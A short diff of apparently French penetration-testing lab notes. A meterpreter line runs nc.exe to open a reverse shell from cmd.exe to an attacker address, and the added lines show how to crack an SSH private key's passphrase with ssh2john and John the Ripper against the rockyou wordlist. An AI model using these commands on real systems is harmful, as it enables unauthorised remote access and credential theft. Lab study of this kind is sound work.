@@ -47,3 +47,16 @@ meterpreter> execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"
 ```
 
 Un shell est accessible depuis le listener Netcat.
+
+John :
+touver passphrase à partir de clé privée :
+1 : créer un hash de la clé avec john
+sudo /usr/share/john/ssh2john.py joanna_rsa > joanna_rsa.hash
+
+2 : brute forcer
+john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash
+
+Premières erreurs :
+
+serveur web :
+ne pas avoir lu main.php qui disait un cat /id.rsa pour le password
